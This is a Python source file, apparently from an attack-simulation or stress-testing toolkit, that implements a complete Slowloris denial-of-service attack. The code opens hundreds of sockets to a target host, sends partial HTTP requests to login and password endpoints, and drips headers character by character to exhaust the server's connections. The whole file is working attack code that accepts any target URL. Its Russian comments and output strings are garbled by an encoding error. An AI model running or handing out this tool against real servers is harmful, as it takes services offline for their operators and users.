import socket
import threading
import time
import random
import os
from colorama import Fore, Style, init
from utils.metrics import metrics_collector
from utils.test_data import test_data_generator

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è colorama –¥–ª—è —Ü–≤–µ—Ç–Ω–æ–≥–æ –≤—ã–≤–æ–¥–∞
init(autoreset=True)

class SlowlorisAttack:
    """–ö–ª–∞—Å—Å –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è Slowloris –∞—Ç–∞–∫–∏"""
    
    def __init__(self, target_host: str, target_port: int = 8080, connections: int = 200, duration: int = 300):
        self.target_host = target_host
        self.target_port = target_port
        self.connections = connections
        self.duration = duration  # –ø—Ä–æ–¥–æ–ª–∂–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –≤ —Å–µ–∫—É–Ω–¥–∞—Ö
        self.running = False
        self.sockets = []
        self.successful_connections = 0
        self.failed_connections = 0
        
        # –°–ø–∏—Å–æ–∫ –∑–∞–≥–æ–ª–æ–≤–∫–æ–≤ –¥–ª—è –º–µ–¥–ª–µ–Ω–Ω–æ–π –æ—Ç–ø—Ä–∞–≤–∫–∏
        self.headers = [
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language: en-us,en;q=0.5",
            "Accept-Encoding: gzip,deflate",
            "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7",
            "Cache-Control: no-cache",
            "Connection: keep-alive"
        ]
    
    def create_socket(self):
        """–°–æ–∑–¥–∞–µ—Ç –Ω–æ–≤–æ–µ —Å–æ–∫–µ—Ç–Ω–æ–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((self.target_host, self.target_port))
            
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–∞—á–∞–ª—å–Ω—É—é —Å—Ç—Ä–æ–∫—É HTTP –∑–∞–ø—Ä–æ—Å–∞
            initial_request = f"GET /{random.choice(['auth/health', 'api/passwords', 'api/notes', 'auth/login'])} HTTP/1.1\r\n"
            sock.send(initial_request.encode('utf-8'))
            
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º Host –∑–∞–≥–æ–ª–æ–≤–æ–∫
            host_header = f"Host: {self.target_host}:{self.target_port}\r\n"
            sock.send(host_header.encode('utf-8'))
            
            return sock
            
        except Exception as e:
            return None
    
    def send_header_slowly(self, sock, header):
        """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –∑–∞–≥–æ–ª–æ–≤–æ–∫ –º–µ–¥–ª–µ–Ω–Ω–æ, –ø–æ –æ–¥–Ω–æ–º—É —Å–∏–º–≤–æ–ª—É"""
        try:
            for char in header + "\r\n":
                sock.send(char.encode('utf-8'))
                time.sleep(random.uniform(0.01, 0.1))  # –°–ª—É—á–∞–π–Ω–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞
            return True
        except:
            return False
    
    def keep_connection_alive(self, sock_id):
        """–ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ –∞–∫—Ç–∏–≤–Ω—ã–º, –æ—Ç–ø—Ä–∞–≤–ª—è—è –∑–∞–≥–æ–ª–æ–≤–∫–∏ –º–µ–¥–ª–µ–Ω–Ω–æ"""
        start_time = time.time()
        header_index = 0
        
        while self.running and (time.time() - start_time) < self.duration:
            try:
                if sock_id >= len(self.sockets) or not self.sockets[sock_id]:
                    break
                
                sock = self.sockets[sock_id]
                
                # –í—ã–±–∏—Ä–∞–µ–º —Å–ª—É—á–∞–π–Ω—ã–π –∑–∞–≥–æ–ª–æ–≤–æ–∫
                if header_index >= len(self.headers):
                    header_index = 0
                
                header = self.headers[header_index]
                
                # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∑–∞–≥–æ–ª–æ–≤–æ–∫ –º–µ–¥–ª–µ–Ω–Ω–æ
                if self.send_header_slowly(sock, header):
                    print(f"{Fore.GREEN}üì° [{sock_id}] –û—Ç–ø—Ä–∞–≤–ª–µ–Ω –∑–∞–≥–æ–ª–æ–≤–æ–∫: {header[:30]}...")
                    
                    # –ó–∞–ø–∏—Å—ã–≤–∞–µ–º –º–µ—Ç—Ä–∏–∫—É
                    metrics_collector.add_metric(
                        response_time=time.time() - start_time,
                        status_code=200,  # –£—Å–ª–æ–≤–Ω–æ —É—Å–ø–µ—à–Ω—ã–π
                        size=len(header),
                        attack_type="SLOWLORIS",
                        endpoint="slow_connection"
                    )
                else:
                    print(f"{Fore.RED}‚ùå [{sock_id}] –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –∑–∞–≥–æ–ª–æ–≤–æ–∫")
                    break
                
                header_index += 1
                
                # –°–ª—É—á–∞–π–Ω–∞—è –ø–∞—É–∑–∞ –º–µ–∂–¥—É –∑–∞–≥–æ–ª–æ–≤–∫–∞–º–∏
                time.sleep(random.uniform(5, 15))
                
            except Exception as e:
                print(f"{Fore.RED}üí• [{sock_id}] –û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è: {str(e)}")
                break
        
        # –ó–∞–∫—Ä—ã–≤–∞–µ–º —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ
        try:
            if sock_id < len(self.sockets) and self.sockets[sock_id]:
                self.sockets[sock_id].close()
                self.sockets[sock_id] = None
                print(f"{Fore.BLUE}üîí [{sock_id}] –°–æ–µ–¥–∏–Ω–µ–Ω–∏–µ –∑–∞–∫—Ä—ã—Ç–æ")
        except:
            pass
    
    def establish_connections(self):
        """–£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç –ø–µ—Ä–≤–æ–Ω–∞—á–∞–ª—å–Ω—ã–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è"""
        print(f"{Fore.YELLOW}üîó –£—Å—Ç–∞–Ω–æ–≤–∫–∞ {self.connections} —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π...")
        
        self.sockets = [None] * self.connections
        
        for i in range(self.connections):
            if not self.running:
                break
                
            sock = self.create_socket()
            if sock:
                self.sockets[i] = sock
                self.successful_connections += 1
                print(f"{Fore.GREEN}‚úÖ –°–æ–µ–¥–∏–Ω–µ–Ω–∏–µ {i+1}/{self.connections} —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ")
            else:
                self.failed_connections += 1
                print(f"{Fore.RED}‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ {i+1}")
            
            # –ù–µ–±–æ–ª—å—à–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è–º–∏
            time.sleep(random.uniform(0.1, 0.5))
        
        print(f"{Fore.CYAN}üìä –£—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π: {self.successful_connections}/{self.connections}")
    
    def run(self):
        """–ó–∞–ø—É—Å–∫ Slowloris –∞—Ç–∞–∫–∏"""
        print(f"\n{Fore.RED}{'='*60}")
        print(f"{Fore.RED}üêå –ó–ê–ü–£–°–ö SLOWLORIS –ê–¢–ê–ö–ò")
        print(f"{Fore.RED}{'='*60}")
        print(f"{Fore.WHITE}–¶–µ–ª—å: {self.target_host}:{self.target_port}")
        print(f"{Fore.WHITE}–°–æ–µ–¥–∏–Ω–µ–Ω–∏–π: {self.connections}")
        print(f"{Fore.WHITE}–ü—Ä–æ–¥–æ–ª–∂–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å: {self.duration} —Å–µ–∫—É–Ω–¥")
        print(f"{Fore.WHITE}–°—Ç—Ä–∞—Ç–µ–≥–∏—è: –ú–µ–¥–ª–µ–Ω–Ω–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞ HTTP –∑–∞–≥–æ–ª–æ–≤–∫–æ–≤")
        print(f"{Fore.RED}{'='*60}")
        
        # –û—á–∏—â–∞–µ–º –ø—Ä–µ–¥—ã–¥—É—â–∏–µ –º–µ—Ç—Ä–∏–∫–∏
        metrics_collector.clear()
        
        self.running = True
        self.successful_connections = 0
        self.failed_connections = 0
        
        start_time = time.time()
        
        # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
        self.establish_connections()
        
        if self.successful_connections == 0:
            print(f"{Fore.RED}‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –Ω–∏ –æ–¥–Ω–æ–≥–æ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è!")
            return None
        
        # –ó–∞–ø—É—Å–∫–∞–µ–º –ø–æ—Ç–æ–∫–∏ –¥–ª—è –ø–æ–¥–¥–µ—Ä–∂–∞–Ω–∏—è —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π
        threads = []
        for i in range(self.successful_connections):
            if self.sockets[i]:
                thread = threading.Thread(target=self.keep_connection_alive, args=(i,))
                thread.daemon = True
                thread.start()
                threads.append(thread)
        
        try:
            # –ñ–¥–µ–º –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –≤—Ä–µ–º–µ–Ω–∏ –∞—Ç–∞–∫–∏
            time.sleep(self.duration)
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}‚èπÔ∏è  –ê—Ç–∞–∫–∞ –ø—Ä–µ—Ä–≤–∞–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º")
        finally:
            self.running = False
        
        # –ñ–¥–µ–º –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –≤—Å–µ—Ö –ø–æ—Ç–æ–∫–æ–≤
        print(f"{Fore.YELLOW}‚è≥ –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π...")
        for thread in threads:
            thread.join(timeout=5)
        
        # –ó–∞–∫—Ä—ã–≤–∞–µ–º –æ—Å—Ç–∞–≤—à–∏–µ—Å—è —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
        for i, sock in enumerate(self.sockets):
            if sock:
                try:
                    sock.close()
                    print(f"{Fore.BLUE}üîí –°–æ–µ–¥–∏–Ω–µ–Ω–∏–µ {i} –ø—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–æ –∑–∞–∫—Ä—ã—Ç–æ")
                except:
                    pass
        
        end_time = time.time()
        duration = end_time - start_time
        
        # –í—ã–≤–æ–¥–∏–º –∏—Ç–æ–≥–æ–≤—É—é —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É
        print(f"\n{Fore.RED}{'='*60}")
        print(f"{Fore.RED}üìä –†–ï–ó–£–õ–¨–¢–ê–¢–´ SLOWLORIS –ê–¢–ê–ö–ò")
        print(f"{Fore.RED}{'='*60}")
        print(f"{Fore.WHITE}–í—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: {duration:.2f} —Å–µ–∫—É–Ω–¥")
        print(f"{Fore.GREEN}–£—Å–ø–µ—à–Ω—ã—Ö —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π: {self.successful_connections}")
        print(f"{Fore.RED}–ù–µ—É–¥–∞—á–Ω—ã—Ö —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π: {self.failed_connections}")
        
        if self.successful_connections > 0:
            print(f"{Fore.YELLOW}–°—Ä–µ–¥–Ω–µ–µ –≤—Ä–µ–º—è —É–¥–µ—Ä–∂–∞–Ω–∏—è —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è: {duration:.2f}—Å")
        
        print(f"{Fore.RED}{'='*60}")
        
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º –º–µ—Ç—Ä–∏–∫–∏
        timestamp = int(time.time())
        csv_filename = f"metrics/slowloris_{timestamp}.csv"
        
        # –î–æ–±–∞–≤–ª—è–µ–º —Ñ–∏–Ω–∞–ª—å–Ω—É—é –º–µ—Ç—Ä–∏–∫—É —Å –æ–±—â–∏–º–∏ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞–º–∏
        metrics_collector.add_metric(
            response_time=duration,
            status_code=200 if self.successful_connections > 0 else 0,
            size=self.successful_connections,
            attack_type="SLOWLORIS",
            endpoint="attack_summary"
        )
        
        metrics_collector.save_to_csv(csv_filename)
        metrics_collector.print_stats()
        
        return csv_filename


def run(target_url: str, connections: int = 200, duration: int = 300):
    """–§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø—É—Å–∫–∞ Slowloris –∞—Ç–∞–∫–∏ (—Å–æ–≤–º–µ—Å—Ç–∏–º–æ—Å—Ç—å —Å –º–µ–Ω—é)"""
    # –ò–∑–≤–ª–µ–∫–∞–µ–º —Ö–æ—Å—Ç –∏ –ø–æ—Ä—Ç –∏–∑ URL
    if "://" in target_url:
        target_url = target_url.split("://")[1]
    
    if ":" in target_url:
        host, port = target_url.split(":")
        port = int(port)
    else:
        host = target_url
        port = 80
    
    attack = SlowlorisAttack(host, port, connections, duration)
    return attack.run() 